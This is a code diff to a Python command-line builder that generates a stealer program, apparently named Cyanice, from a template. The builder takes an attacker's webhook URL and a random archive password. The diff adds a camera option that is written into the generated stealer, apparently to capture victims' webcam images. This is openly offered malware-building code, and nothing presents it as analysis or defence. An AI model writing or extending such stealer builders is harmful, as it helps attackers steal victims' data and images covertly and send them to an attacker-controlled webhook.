@@ -32,8 +32,9 @@ def zipfolder(foldername, target_dir, password: bytes):
 @click.command()
 @click.argument("webhook", required=1, type=str)
 @click.option('-o', "--output", type=str, required=1, help="Output file")
+@click.option('--camera/--no-camera', default=False)
 
-def builder(webhook, output):
+def builder(webhook, output, camera):
     password = get_random_string(20)
 
     stealerpy = output+".py"
@@ -46,6 +47,8 @@ def builder(webhook, output):
     
     with open(stealerPath, "r") as f:
         template = f.read().replace(r"%webhook%", webhook)
+        print(f"[{Fore.GREEN}${Fore.RESET}] Add camera option... ({camera})")
+        template = template.replace(r"%camera%", str(camera))
     
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
     
